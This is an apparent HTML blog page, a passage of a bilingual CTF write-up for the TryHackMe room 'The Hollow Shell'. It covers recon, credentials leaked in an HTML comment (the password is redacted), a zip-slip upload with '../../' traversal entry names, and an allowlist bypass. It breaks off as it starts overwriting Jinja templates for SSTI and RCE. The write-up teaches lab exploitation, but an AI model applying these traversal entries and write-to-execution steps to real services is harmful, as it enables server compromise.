@@ -1,0 +1,354 @@
+<!DOCTYPE html>
+<html lang="it" id="html-root">
+<head>
+  <meta charset="UTF-8"/>
+  <!-- flag trattenuta fino a fine evento: nessun valore reale in questo file -->
+  <meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src 'self' data:; script-src 'self' 'unsafe-inline'; style-src 'self' https://fonts.googleapis.com 'unsafe-inline'; font-src https://fonts.gstatic.com; connect-src 'self';"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title data-it="The Hollow Shell (THM): zip-slip → SSTI → RCE — NonèCostanzo" data-en="The Hollow Shell (THM): zip-slip → SSTI → RCE — NonèCostanzo">The Hollow Shell (THM): zip-slip → SSTI → RCE — NonèCostanzo</title>
+  <meta name="description" data-it="Writeup TryHackMe The Hollow Shell (Hacker Holidays 2026): zip-slip nell'upload .zip, bypass dell'allowlist, SSTI su template Jinja e RCE su Flask/gunicorn." data-en="TryHackMe The Hollow Shell writeup (Hacker Holidays 2026): upload .zip zip-slip, allowlist bypass, SSTI on Jinja templates and RCE on Flask/gunicorn." content="Writeup TryHackMe The Hollow Shell (Hacker Holidays 2026): zip-slip nell'upload .zip, bypass dell'allowlist, SSTI su template Jinja e RCE su Flask/gunicorn."/>
+  <link rel="canonical" href="https://paolocostanzo.github.io/ctf/hacker-holidays-2026/the-hollow-shell/"/>
+  <link rel="icon" type="image/x-icon" href="/favicon.ico"/>
+  <link rel="preconnect" href="https://fonts.googleapis.com"/>
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin/>
+  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Barlow:wght@300;400;600;700&family=Barlow+Condensed:wght@700;900&display=swap" rel="stylesheet"/>
+<style>
+    :root{--orange:#ff6a00;--orange-faint:rgba(255,106,0,0.06);--black:#080808;--surface:#101010;--surface2:#161616;--border:#222;--text:#e8e8e8;--muted:#666;--mono:'Share Tech Mono',monospace;--sans:'Barlow',sans-serif;--condensed:'Barlow Condensed',sans-serif}
+    *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+    html{scroll-behavior:smooth}
+    body{background:var(--black);color:var(--text);font-family:var(--sans);font-weight:300;line-height:1.7;overflow-x:hidden}
+    a{color:inherit;text-decoration:none}
+    header{position:sticky;top:0;z-index:100;background:rgba(8,8,8,0.95);backdrop-filter:blur(12px);border-bottom:1px solid var(--border)}
+    .header-inner{max-width:960px;margin:0 auto;padding:0 2rem;height:56px;display:flex;align-items:center;justify-content:space-between}
+    .back-link{font-family:var(--mono);font-size:0.75rem;color:var(--muted);letter-spacing:0.1em;transition:color 0.2s;display:flex;align-items:center;gap:0.5rem}
+    .back-link:hover{color:var(--orange)}
+    .logo{font-family:var(--mono);font-size:0.85rem}
+    .logo .dim{color:#fff}.logo .name{color:var(--orange)}
+    .article-header{max-width:960px;margin:0 auto;padding:4rem 2rem 3rem;border-bottom:1px solid var(--border)}
+    .article-meta{display:flex;align-items:center;gap:1.5rem;margin-bottom:2rem;flex-wrap:wrap}
+    .tag{font-family:var(--mono);font-size:0.65rem;color:var(--orange);letter-spacing:0.2em;text-transform:uppercase;border:1px solid var(--orange);padding:0.2rem 0.6rem}
+    .meta-item{font-family:var(--mono);font-size:0.65rem;color:var(--muted);letter-spacing:0.1em}
+    .difficulty-badge{font-family:var(--mono);font-size:0.65rem;letter-spacing:0.1em;display:flex;align-items:center;gap:0.4rem}
+    .dot{width:6px;height:6px;border-radius:50%}
+    h1{font-family:var(--condensed);font-size:clamp(2rem,5vw,3.5rem);font-weight:900;text-transform:uppercase;letter-spacing:-0.01em;line-height:1.05;color:var(--text);margin-bottom:1.5rem}
+    .article-intro{font-size:1.1rem;color:var(--muted);max-width:760px;line-height:1.8}
+    .article-body{max-width:960px;margin:0 auto;padding:3rem 2rem 5rem}
+    .article-body h2{font-family:var(--condensed);font-size:1.6rem;font-weight:700;text-transform:uppercase;letter-spacing:0.04em;color:var(--text);margin:3rem 0 1rem;padding-bottom:0.5rem;border-bottom:1px solid var(--border)}
+    .article-body h3{font-family:var(--condensed);font-size:1.2rem;font-weight:700;color:var(--orange);text-transform:uppercase;letter-spacing:0.06em;margin:2rem 0 0.75rem}
+    .article-body p{font-size:1rem;color:#bbb;line-height:1.85;margin-bottom:1.25rem}
+    .article-body strong{color:var(--text);font-weight:600}
+    .article-body em{color:var(--muted);font-style:italic}
+    .article-body ul,.article-body ol{margin:1rem 0 1.25rem 1.5rem}
+    .article-body li{font-size:1rem;color:#bbb;line-height:1.8;margin-bottom:0.4rem}
+    .code-block{background:#0a0a0a;border:1px solid var(--border);border-left:3px solid var(--orange);padding:1.5rem;margin:1.5rem 0;overflow-x:auto}
+    .code-block pre{font-family:var(--mono);font-size:0.78rem;color:var(--orange);line-height:1.8;white-space:pre}
+    .code-block .comment{color:var(--muted)}
+    .code-block .danger{color:#ff3333}
+    .code-block .ok{color:#00ff88}
+    .code-block .neutral{color:#aaa}
+    .code-block .warn{color:#ffaa00}
+    .callout{background:var(--orange-faint);border:1px solid rgba(255,106,0,0.25);border-left:3px solid var(--orange);padding:1.25rem 1.5rem;margin:2rem 0}
+    .callout-label{font-family:var(--mono);font-size:0.65rem;color:var(--orange);letter-spacing:0.2em;text-transform:uppercase;margin-bottom:0.5rem}
+    .callout p{font-size:0.9rem;color:var(--text);margin:0}
+    .callout-red{background:rgba(255,51,51,0.04);border:1px solid rgba(255,51,51,0.2);border-left:3px solid #ff3333;padding:1.25rem 1.5rem;margin:2rem 0}
+    .callout-red .callout-label{font-family:var(--mono);font-size:0.65rem;color:#ff5555;letter-spacing:0.2em;text-transform:uppercase;margin-bottom:0.5rem}
+    .callout-red p{font-size:0.9rem;color:var(--text);margin:0}
+    .callout-green{background:rgba(0,255,136,0.03);border:1px solid rgba(0,255,136,0.15);border-left:3px solid #00ff88;padding:1.25rem 1.5rem;margin:2rem 0}
+    .callout-green .callout-label{font-family:var(--mono);font-size:0.65rem;color:#00ff88;letter-spacing:0.2em;text-transform:uppercase;margin-bottom:0.5rem}
+    .callout-green p{font-size:0.9rem;color:var(--text);margin:0}
+    .tldr{background:var(--surface2);border:1px solid var(--border);padding:2rem;margin-bottom:3rem}
+    .tldr-label{font-family:var(--mono);font-size:0.7rem;color:var(--orange);letter-spacing:0.2em;text-transform:uppercase;margin-bottom:1rem}
+    .tldr ul{margin-left:1.25rem}
+    .tldr li{font-size:0.9rem;color:var(--text);line-height:1.7;margin-bottom:0.4rem}
+    .tldr p{font-size:0.88rem;color:var(--muted);margin:1rem 0 0;line-height:1.7}
+    table{width:100%;border-collapse:collapse;margin:1.5rem 0;font-family:var(--mono);font-size:0.78rem}
+    th{text-align:left;color:var(--orange);padding:0.6rem 0.75rem;border-bottom:1px solid var(--border);letter-spacing:0.1em;text-transform:uppercase}
+    td{padding:0.55rem 0.75rem;border-bottom:1px solid #1a1a1a;color:#bbb;vertical-align:top}
+    td.ok{color:#00ff88}
+    td.danger{color:#ff5555}
+    td.warn{color:#ffaa00}
+    td strong{color:var(--text)}
+    tr:last-child td{border-bottom:none}
+    .article-footer{border-top:1px solid var(--border);padding:2rem;display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:1rem}
+    .article-footer a{font-family:var(--mono);font-size:0.75rem;color:var(--orange);letter-spacing:0.1em;transition:opacity 0.2s}
+    .footer-copy{font-family:var(--mono);font-size:0.65rem;color:var(--muted);opacity:0.5}
+    @media(max-width:768px){h1{font-size:2rem}table{font-size:0.7rem}}
+    .lang-toggle{display:flex;border:1px solid var(--border);overflow:hidden;flex-shrink:0}
+    .lang-btn{font-family:var(--mono);font-size:0.65rem;padding:0.3rem 0.6rem;background:transparent;color:var(--muted);border:none;cursor:pointer;letter-spacing:0.08em;text-transform:uppercase;transition:all .2s}
+    .lang-btn.active{background:var(--orange);color:var(--black)}
+    .lang-btn:hover:not(.active){color:var(--orange)}
+    #read-bar{position:fixed;top:0;left:0;height:2px;width:0%;background:var(--orange);z-index:200;transition:width .08s linear;pointer-events:none}
+    #back-top{position:fixed;bottom:1.75rem;right:1.75rem;font-family:var(--mono);font-size:0.6rem;letter-spacing:0.12em;text-transform:uppercase;color:var(--muted);background:var(--surface);border:1px solid var(--border);padding:0.45rem 0.7rem;cursor:pointer;opacity:0;pointer-events:none;transition:opacity .25s,color .2s,border-color .2s;z-index:150}
+    #back-top.vis{opacity:1;pointer-events:all}
+    #back-top:hover{color:var(--orange);border-color:var(--orange)}
+    .share-wrap{max-width:960px;margin:0 auto;padding:1.5rem 2rem;display:flex;align-items:center;gap:1rem;flex-wrap:wrap;border-top:1px solid var(--border)}
+    .share-lbl{font-family:var(--mono);font-size:0.6rem;color:var(--muted);letter-spacing:0.18em;text-transform:uppercase;flex-shrink:0}
+    .share-btns{display:flex;gap:0.4rem;flex-wrap:wrap}
+    .share-btn{font-family:var(--mono);font-size:0.6rem;letter-spacing:0.08em;color:var(--muted);border:1px solid var(--border);padding:0.3rem 0.65rem;background:transparent;cursor:pointer;transition:color .2s,border-color .2s;text-decoration:none;display:inline-block}
+    .share-btn:hover{color:var(--orange);border-color:var(--orange)}
+    .share-btn.ok{color:#00ff88;border-color:#00ff88}
+    .auth-wrap{display:flex;align-items:center;gap:0.5rem}
+    .auth-bar{width:44px;height:3px;background:var(--border);overflow:hidden;flex-shrink:0}
+    .auth-human{height:100%;background:var(--orange)}
+    .auth-lbl{font-family:var(--mono);font-size:0.6rem;color:var(--muted);letter-spacing:0.08em}
+    .cve-badge{display:inline-block;font-family:var(--mono);font-size:0.7rem;background:rgba(255,51,51,0.08);border:1px solid rgba(255,51,51,0.3);color:#ff5555;padding:0.3rem 0.75rem;letter-spacing:0.05em;margin:0.5rem 0}
+    .lang-en{display:none}
+      /* AUTHOR BOX */
+    .author-box{max-width:760px;margin:3.5rem auto 0;padding:1.75rem;background:var(--surface);border:1px solid var(--border);border-left:3px solid var(--orange)}
+    .author-box .ab-label{font-family:var(--mono);font-size:0.65rem;color:var(--muted);letter-spacing:0.18em;text-transform:uppercase}
+    .author-box .ab-name{font-family:var(--condensed);font-weight:900;font-size:1.5rem;text-transform:uppercase;color:var(--text);letter-spacing:0.02em;margin-top:0.5rem;line-height:1}
+    .author-box .ab-role{font-family:var(--mono);font-size:0.68rem;color:var(--orange);margin-top:0.45rem;line-height:1.6}
+    .author-box .ab-bio{font-size:0.9rem;color:var(--muted);line-height:1.65;margin-top:0.9rem}
+    .author-box .ab-links{display:flex;flex-wrap:wrap;gap:0.6rem;margin-top:1.2rem;align-items:center}
+    .author-box .ab-links a{font-family:var(--mono);font-size:0.68rem;color:var(--muted);border:1px solid var(--border);padding:0.4rem 0.8rem;letter-spacing:0.08em;transition:border-color .2s,color .2s}
+    .author-box .ab-links a:hover{border-color:var(--orange);color:var(--orange)}
+    .author-box .ab-links a.ab-cta{color:var(--orange);border-color:var(--orange)}
+    .author-box .ab-links a.ab-cta:hover{background:var(--orange);color:var(--black)}
+    @media(max-width:600px){.author-box{margin:2.5rem 1.25rem 0;padding:1.25rem}}
+</style>
+
+  <style>
+    .article-body code,.tldr code,.callout code,.callout-red code,.callout-green code{font-family:var(--mono);color:var(--orange)}
+    .redaction{font-family:var(--mono);color:var(--orange);letter-spacing:2px}
+    .crumb{max-width:960px;margin:0 auto;padding:1rem 2rem 0;font-family:var(--mono);font-size:0.66rem;color:#5f5f5f;letter-spacing:0.08em}
+    .crumb a{color:var(--muted)}.crumb a:hover{color:var(--orange)}.crumb .here{color:var(--orange)}
+    .meme-tag{font-family:var(--mono);font-size:0.6rem;color:var(--muted);letter-spacing:0.06em;border:1px dashed var(--border);padding:0.25rem 0.6rem}
+  </style>
+  <meta property="og:type" content="article"/>
+  <meta property="og:site_name" content="NonèCostanzo — Paolo Costanzo"/>
+  <meta property="og:title" data-it="The Hollow Shell (THM): zip-slip → SSTI → RCE — NonèCostanzo" data-en="The Hollow Shell (THM): zip-slip → SSTI → RCE — NonèCostanzo" content="The Hollow Shell (THM): zip-slip → SSTI → RCE — NonèCostanzo"/>
+  <meta property="og:description" data-it="Writeup TryHackMe The Hollow Shell (Hacker Holidays 2026): zip-slip nell'upload .zip, bypass dell'allowlist, SSTI su template Jinja e RCE su Flask/gunicorn." data-en="TryHackMe The Hollow Shell writeup (Hacker Holidays 2026): upload .zip zip-slip, allowlist bypass, SSTI on Jinja templates and RCE on Flask/gunicorn." content="Writeup TryHackMe The Hollow Shell (Hacker Holidays 2026): zip-slip nell'upload .zip, bypass dell'allowlist, SSTI su template Jinja e RCE su Flask/gunicorn."/>
+  <meta property="og:url" content="https://paolocostanzo.github.io/ctf/hacker-holidays-2026/the-hollow-shell/"/>
+  <meta property="og:image" content="https://paolocostanzo.github.io/ctf/hacker-holidays-2026/the-hollow-shell/og.png"/>
+  <meta property="og:image:width" content="1200"/><meta property="og:image:height" content="630"/>
+  <meta property="og:image:alt" content="The Hollow Shell — CTF walkthrough"/>
+  <meta property="og:locale" data-it="it_IT" data-en="en_US" content="it_IT"/>
+  <meta property="article:published_time" content="2026-08-05T09:00:00+02:00"/>
+  <meta property="article:modified_time" content="2026-08-05T09:00:00+02:00"/>
+  <meta property="article:author" content="https://www.paolocostanzo.com"/>
+  <meta property="article:section" content="CTF"/>
+  <meta name="twitter:card" content="summary_large_image"/>
+  <meta name="twitter:title" data-it="The Hollow Shell (THM): zip-slip → SSTI → RCE — NonèCostanzo" data-en="The Hollow Shell (THM): zip-slip → SSTI → RCE — NonèCostanzo" content="The Hollow Shell (THM): zip-slip → SSTI → RCE — NonèCostanzo"/>
+  <meta name="twitter:description" data-it="Writeup TryHackMe The Hollow Shell (Hacker Holidays 2026): zip-slip nell'upload .zip, bypass dell'allowlist, SSTI su template Jinja e RCE su Flask/gunicorn." data-en="TryHackMe The Hollow Shell writeup (Hacker Holidays 2026): upload .zip zip-slip, allowlist bypass, SSTI on Jinja templates and RCE on Flask/gunicorn." content="Writeup TryHackMe The Hollow Shell (Hacker Holidays 2026): zip-slip nell'upload .zip, bypass dell'allowlist, SSTI su template Jinja e RCE su Flask/gunicorn."/>
+  <meta name="twitter:image" content="https://paolocostanzo.github.io/ctf/hacker-holidays-2026/the-hollow-shell/og.png"/>
+  <script type="application/ld+json">
+{
+  "@context":"https://schema.org","@type":"TechArticle",
+  "headline":"The Hollow Shell (THM): zip-slip \u2192 SSTI \u2192 RCE",
+  "description":"Writeup TryHackMe The Hollow Shell (Hacker Holidays 2026): zip-slip nell'upload .zip, bypass dell'allowlist, SSTI su template Jinja e RCE su Flask/gunicorn.",
+  "image":["https://paolocostanzo.github.io/ctf/hacker-holidays-2026/the-hollow-shell/og.png"],"datePublished":"2026-08-05T09:00:00+02:00","dateModified":"2026-08-05T09:00:00+02:00","inLanguage":"it","articleSection":"CTF",
+  "keywords":"TryHackMe, Hacker Holidays 2026, The Hollow Shell, Web, TryHackMe, CTF walkthrough",
+  "mainEntityOfPage":{"@type":"WebPage","@id":"https://paolocostanzo.github.io/ctf/hacker-holidays-2026/the-hollow-shell/"},"url":"https://paolocostanzo.github.io/ctf/hacker-holidays-2026/the-hollow-shell/",
+  "author":{"@type":"Person","name":"Paolo Costanzo","url":"https://www.paolocostanzo.com","sameAs":["https://www.linkedin.com/in/paolocostanzoit/","https://github.com/paolocostanzo","https://www.researchgate.net/profile/Paolo-Costanzo-2"]},
+  "publisher":{"@type":"Person","name":"Paolo Costanzo","url":"https://www.paolocostanzo.com"},
+  "about":{"@type":"Thing","name":"TryHackMe — The Hollow Shell"}
+}
+  </script>
+  <script type="application/ld+json">
+{
+  "@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[
+    {"@type":"ListItem","position":1,"name":"CTF","item":"https://paolocostanzo.github.io/ctf/"},
+    {"@type":"ListItem","position":2,"name":"Hacker Holidays 2026","item":"https://paolocostanzo.github.io/ctf/hacker-holidays-2026/"},
+    {"@type":"ListItem","position":3,"name":"The Hollow Shell","item":"https://paolocostanzo.github.io/ctf/hacker-holidays-2026/the-hollow-shell/"}
+  ]
+}
+  </script>
+</head>
+
+<body>
+  <div id="read-bar"></div>
+  <header>
+    <div class="header-inner">
+      <a class="back-link" href="/ctf/hacker-holidays-2026/" data-it="← Hacker Holidays 2026" data-en="← Hacker Holidays 2026">← Hacker Holidays 2026</a>
+      <div class="logo"><span class="dim">nonè@</span><span class="name">costanzo</span><span class="dim">:~$</span></div>
+      <div class="lang-toggle">
+        <button class="lang-btn active" onclick="setLang('it')" aria-pressed="true">IT</button>
+        <button class="lang-btn" onclick="setLang('en')" aria-pressed="false">EN</button>
+      </div>
+    </div>
+  </header>
+  <nav class="crumb" aria-label="breadcrumb"><a href="/ctf/">CTF</a> / <a href="/ctf/hacker-holidays-2026/">Hacker Holidays 2026</a> / <span class="here">The Hollow Shell</span></nav>
+  <main>
+  <article>
+  <div class="article-header">
+    <div class="article-meta">
+      <span class="tag">Web</span><span class="tag">TryHackMe</span>
+      <span class="tag">TryHackMe</span>
+      <time class="meta-item" datetime="2026-08-05" data-it="05 Ago 2026" data-en="05 Aug 2026">05 Ago 2026</time>
+      <span class="meta-item" data-it="9 min di lettura" data-en="9 min read">9 min di lettura</span>
+      <span class="difficulty-badge" style="color:#ffaa00"><span class="dot" style="background:#ffaa00"></span><span>Medium</span></span>
+      <span class="meme-tag" data-it="// ../../ con affetto" data-en="// ../../ with love">// ../../ con affetto</span>
+    </div>
+    <h1 data-it="The Hollow Shell: zip-slip nell'upload, poi SSTI, poi shell" data-en="The Hollow Shell: upload zip-slip, then SSTI, then shell">The Hollow Shell: zip-slip nell'upload, poi SSTI, poi shell</h1>
+    <p class="article-intro" data-it="Un portale invita a caricare una «shell» — un pacchetto .zip di ambiance balneare per i tablet delle camere. La room ti sussurra all'orecchio di cercare degli «automation hook»: non farlo, sono un depistaggio. La vera catena è un estrattore di zip che si fida dei nomi dei file, un allowlist che guarda dalla parte sbagliata, e un dettaglio della cache dei template di Jinja che trasforma una scrittura arbitraria in esecuzione di codice." data-en="A portal invites you to upload a &quot;shell&quot; — a .zip pack of seaside ambiance for the room tablets. The room whispers at you to hunt for &quot;automation hooks&quot;: don't, they are a red herring. The real chain is a zip extractor that trusts filenames, an allowlist looking the wrong way, and a Jinja template-cache detail that turns an arbitrary write into code execution.">Un portale invita a caricare una «shell» — un pacchetto .zip di ambiance balneare per i tablet delle camere. La room ti sussurra all'orecchio di cercare degli «automation hook»: non farlo, sono un depistaggio. La vera catena è un estrattore di zip che si fida dei nomi dei file, un allowlist che guarda dalla parte sbagliata, e un dettaglio della cache dei template di Jinja che trasforma una scrittura arbitraria in esecuzione di codice.</p>
+  </div>
+  <div class="article-body">
+
+    <div class="tldr">
+      <div class="tldr-label" data-it="// TL;DR" data-en="// TL;DR">// TL;DR</div>
+      <ul><li data-it="&lt;strong&gt;Credenziali&lt;/strong&gt; lasciate in un commento HTML multilinea nella pagina di login." data-en="&lt;strong&gt;Credentials&lt;/strong&gt; left in a multi-line HTML comment on the login page."><strong>Credenziali</strong> lasciate in un commento HTML multilinea nella pagina di login.</li><li data-it="&lt;strong&gt;Zip-slip&lt;/strong&gt;: l'upload estrae le entry del .zip senza sanificare i &lt;code&gt;../&lt;/code&gt; nei nomi → scrittura di file arbitraria." data-en="&lt;strong&gt;Zip-slip&lt;/strong&gt;: the upload extracts .zip entries without sanitising &lt;code&gt;../&lt;/code&gt; in names → arbitrary file write."><strong>Zip-slip</strong>: l'upload estrae le entry del .zip senza sanificare i <code>../</code> nei nomi → scrittura di file arbitraria.</li><li data-it="&lt;strong&gt;Allowlist aggirata&lt;/strong&gt;: il controllo guarda i file &lt;em&gt;dichiarati&lt;/em&gt; nel manifest, non quelli realmente estratti." data-en="&lt;strong&gt;Allowlist bypass&lt;/strong&gt;: the check inspects the files &lt;em&gt;declared&lt;/em&gt; in the manifest, not those actually extracted."><strong>Allowlist aggirata</strong>: il controllo guarda i file <em>dichiarati</em> nel manifest, non quelli realmente estratti.</li><li data-it="&lt;strong&gt;Da write a RCE&lt;/strong&gt;: sovrascrivo un template Jinja con un payload SSTI. Trucco fresh-worker per battere la cache dei template." data-en="&lt;strong&gt;From write to RCE&lt;/strong&gt;: overwrite a Jinja template with an SSTI payload. Fresh-worker trick to beat the template cache."><strong>Da write a RCE</strong>: sovrascrivo un template Jinja con un payload SSTI. Trucco fresh-worker per battere la cache dei template.</li></ul>
+    </div>
+
+    <h2 data-it="[01] Ricognizione — due porte, una sola via" data-en="[01] Recon — two ports, one way in" id='recon'>[01] Ricognizione — due porte, una sola via</h2>
+    <p data-it="Superficie d'attacco minima: SSH sulla 22 e un'app Flask servita da gunicorn sulla 5000. Con SSH fuori discussione, la 5000 è l'unica strada. La root fa un redirect a &lt;code&gt;/login&lt;/code&gt;." data-en="Minimal attack surface: SSH on 22 and a Flask app served by gunicorn on 5000. With SSH off the table, 5000 is the only road. The root redirects to &lt;code&gt;/login&lt;/code&gt;.">Superficie d'attacco minima: SSH sulla 22 e un'app Flask servita da gunicorn sulla 5000. Con SSH fuori discussione, la 5000 è l'unica strada. La root fa un redirect a <code>/login</code>.</p>
+    <div class="lang-it"><div class="code-block">
+<pre><span class="comment"># nmap -Pn -sV -p- &lt;target&gt;</span>
+<span class="neutral">22/tcp    open  ssh      OpenSSH 9.6p1 Ubuntu</span>
+<span class="neutral">5000/tcp  open  http     Gunicorn</span>
+<span class="comment"># la root risponde 302 -&gt; /login</span></pre>
+</div></div>
+<div class="lang-en"><div class="code-block">
+<pre><span class="comment"># nmap -Pn -sV -p- &lt;target&gt;</span>
+<span class="neutral">22/tcp    open  ssh      OpenSSH 9.6p1 Ubuntu</span>
+<span class="neutral">5000/tcp  open  http     Gunicorn</span>
+<span class="comment"># the root returns 302 -&gt; /login</span></pre>
+</div></div>
+
+    <h2 data-it="[02] Il commento che non doveva restare" data-en="[02] The comment that should not have stayed" id='leaked-creds'>[02] Il commento che non doveva restare</h2>
+    <p data-it="La pagina di login nasconde le credenziali in un commento HTML multilinea, di quelli che una regex frettolosa &lt;code&gt;&amp;lt;!--.*?--&amp;gt;&lt;/code&gt; senza flag DOTALL si perde. Lezione uno di ogni CTF web: &lt;strong&gt;leggi sempre il sorgente&lt;/strong&gt;." data-en="The login page hides credentials in a multi-line HTML comment, the kind a hurried &lt;code&gt;&amp;lt;!--.*?--&amp;gt;&lt;/code&gt; regex without the DOTALL flag will miss. Web-CTF lesson one: &lt;strong&gt;always read the source&lt;/strong&gt;.">La pagina di login nasconde le credenziali in un commento HTML multilinea, di quelli che una regex frettolosa <code>&lt;!--.*?--&gt;</code> senza flag DOTALL si perde. Lezione uno di ogni CTF web: <strong>leggi sempre il sorgente</strong>.</p>
+    <div class="lang-it"><div class="code-block">
+<pre><span class="comment"># credenziali nel commento HTML di /login (password oscurata)</span>
+user: <span class="danger">concierge</span>
+pass: <span class="danger">████</span></pre>
+</div></div>
+<div class="lang-en"><div class="code-block">
+<pre><span class="comment"># credentials in the /login HTML comment (password redacted)</span>
+user: <span class="danger">concierge</span>
+pass: <span class="danger">████</span></pre>
+</div></div>
+
+    <h2 data-it="[03] Zip-slip — l'estrattore si fida dei nomi" data-en="[03] Zip-slip — the extractor trusts the names" id='zip-slip'>[03] Zip-slip — l'estrattore si fida dei nomi</h2>
+    <p data-it="Un .zip può contenere entry il cui &lt;em&gt;nome&lt;/em&gt; include &lt;code&gt;../&lt;/code&gt;. Se il codice estrae con un banale &lt;code&gt;join(dest, entry.name)&lt;/code&gt; senza normalizzare, quei &lt;code&gt;../&lt;/code&gt; risalgono l'albero e scrivono &lt;strong&gt;fuori&lt;/strong&gt; dalla cartella prevista." data-en="A .zip can contain entries whose &lt;em&gt;name&lt;/em&gt; includes &lt;code&gt;../&lt;/code&gt;. If the code extracts with a naive &lt;code&gt;join(dest, entry.name)&lt;/code&gt; without normalising, those &lt;code&gt;../&lt;/code&gt; climb the tree and write &lt;strong&gt;outside&lt;/strong&gt; the intended folder.">Un .zip può contenere entry il cui <em>nome</em> include <code>../</code>. Se il codice estrae con un banale <code>join(dest, entry.name)</code> senza normalizzare, quei <code>../</code> risalgono l'albero e scrivono <strong>fuori</strong> dalla cartella prevista.</p>
+    <div class="lang-it"><div class="code-block">
+<pre><span class="comment"># ogni shell è estratta in &lt;base&gt;/shells/&lt;id&gt;/ e servita su /shells/&lt;id&gt;/&lt;file&gt;</span>
+<span class="comment"># carico prima una shell, annoto l'&lt;id&gt;, poi in un SECONDO zip:</span>
+<span class="neutral">z.writestr("shell.json", '{"name":"slip","assets":["bg.png"]}')</span>
+<span class="danger">z.writestr("../../shells/&lt;id-noto&gt;/p2.json", '{}')</span>
+# dopo l'upload: GET /shells/&lt;id-noto&gt;/p2.json -&gt; <span class="ok">200</span> = write-outside confermato</pre>
+</div></div>
+<div class="lang-en"><div class="code-block">
+<pre><span class="comment"># each shell is extracted into &lt;base&gt;/shells/&lt;id&gt;/ and served at /shells/&lt;id&gt;/&lt;file&gt;</span>
+<span class="comment"># first upload a shell, note the &lt;id&gt;, then in a SECOND zip:</span>
+<span class="neutral">z.writestr("shell.json", '{"name":"slip","assets":["bg.png"]}')</span>
+<span class="danger">z.writestr("../../shells/&lt;known-id&gt;/p2.json", '{}')</span>
+# after upload: GET /shells/&lt;known-id&gt;/p2.json -&gt; <span class="ok">200</span> = write-outside confirmed</pre>
+</div></div>
+    <div class="callout">
+  <div class="callout-label" data-it="// nota di metodo — il limite del canale di lettura" data-en="// method note — the read-channel limit">// nota di metodo — il limite del canale di lettura</div>
+  <p data-it="Il canale di lettura è &lt;strong&gt;limitato&lt;/strong&gt;: &lt;code&gt;/shells/&amp;lt;id&amp;gt;/&amp;lt;file&amp;gt;&lt;/code&gt; passa da &lt;code&gt;safe_join&lt;/code&gt; (niente &lt;code&gt;../&lt;/code&gt; nella URL) e i symlink nell'archivio finiscono come file di testo, non seguiti. Posso rileggere solo ciò che ho scritto sotto &lt;code&gt;shells/&lt;/code&gt; — per leggere altrove serve &lt;strong&gt;esecuzione&lt;/strong&gt;." data-en="The read channel is &lt;strong&gt;limited&lt;/strong&gt;: &lt;code&gt;/shells/&amp;lt;id&amp;gt;/&amp;lt;file&amp;gt;&lt;/code&gt; goes through &lt;code&gt;safe_join&lt;/code&gt; (no &lt;code&gt;../&lt;/code&gt; in the URL) and archive symlinks land as text files, not followed. I can only read back what I wrote under &lt;code&gt;shells/&lt;/code&gt; — reading elsewhere needs &lt;strong&gt;execution&lt;/strong&gt;.">Il canale di lettura è <strong>limitato</strong>: <code>/shells/&lt;id&gt;/&lt;file&gt;</code> passa da <code>safe_join</code> (niente <code>../</code> nella URL) e i symlink nell'archivio finiscono come file di testo, non seguiti. Posso rileggere solo ciò che ho scritto sotto <code>shells/</code> — per leggere altrove serve <strong>esecuzione</strong>.</p>
+</div>
+
+    <h2 data-it="[04] L'allowlist che guarda dalla parte sbagliata" data-en="[04] The allowlist looking the wrong way" id='allowlist-bypass'>[04] L'allowlist che guarda dalla parte sbagliata</h2>
+    <p data-it="Il portale dichiara di accettare solo &lt;code&gt;png jpg gif svg css json&lt;/code&gt;. Ma il controllo itera sulla lista &lt;code&gt;assets&lt;/code&gt; del manifest — ciò che l'archivio &lt;em&gt;dichiara&lt;/em&gt; — non sui file realmente estratti. Un file non dichiarato (un template .html) finisce comunque su disco. Allowlist e zip-slip insieme danno la primitiva completa: &lt;strong&gt;scrivo qualunque file, ovunque&lt;/strong&gt;." data-en="The portal claims it only accepts &lt;code&gt;png jpg gif svg css json&lt;/code&gt;. But the check iterates over the manifest's &lt;code&gt;assets&lt;/code&gt; list — what the archive &lt;em&gt;declares&lt;/em&gt; — not over the files actually extracted. An undeclared file (an .html template) still lands on disk. Allowlist plus zip-slip give the full primitive: &lt;strong&gt;write any file, anywhere&lt;/strong&gt;.">Il portale dichiara di accettare solo <code>png jpg gif svg css json</code>. Ma il controllo itera sulla lista <code>assets</code> del manifest — ciò che l'archivio <em>dichiara</em> — non sui file realmente estratti. Un file non dichiarato (un template .html) finisce comunque su disco. Allowlist e zip-slip insieme danno la primitiva completa: <strong>scrivo qualunque file, ovunque</strong>.</p>
+
+    <h2 data-it="[05] Da «scrivo un file» a «eseguo codice»" data-en="[05] From &quot;I write a file&quot; to &quot;I run code&quot;" id='rce'>[05] Da «scrivo un file» a «eseguo codice»</h2>
+    <p data-it="La scrittura arbitraria non è ancora esecuzione, e diversi tentativi ovvi non pagano: SSTI diretta sul campo &lt;code&gt;name&lt;/code&gt; (renderizzato ma &lt;em&gt;escaped&lt;/em&gt;); chiave SSH nelle ~45 home (niente write); cron in &lt;code&gt;/etc/cron.d&lt;/code&gt; (non siamo root); symlink (scritti come testo). Il vettore giusto è l'app: &lt;strong&gt;sovrascrivere un template Jinja&lt;/strong&gt;, che Flask valuta lato server." data-en="Arbitrary write is not execution yet, and several obvious attempts don't pay off: direct SSTI on the &lt;code&gt;name&lt;/code&gt; field (rendered but &lt;em&gt;escaped&lt;/em&gt;); an SSH key in ~45 homes (no write); a cron in &lt;code&gt;/etc/cron.d&lt;/code&gt; (not root); symlinks (written as text). The right vector is the app: &lt;strong&gt;overwrite a Jinja template&lt;/strong&gt;, which Flask evaluates server-side.">La scrittura arbitraria non è ancora esecuzione, e diversi tentativi ovvi non pagano: SSTI diretta sul campo <code>name</code> (renderizzato ma <em>escaped</em>); chiave SSH nelle ~45 home (niente write); cron in <code>/etc/cron.d</code> (non siamo root); symlink (scritti come testo). Il vettore giusto è l'app: <strong>sovrascrivere un template Jinja</strong>, che Flask valuta lato server.</p>
+    <div class="lang-it"><div class="code-block">
+<pre><span class="comment"># payload SSTI al posto di templates/login.html (e dashboard.html) via zip-slip</span>
+<span class="comment"># NB: qui non serve conoscere alcun &lt;id&gt;: ../../ atterra nella base app</span>
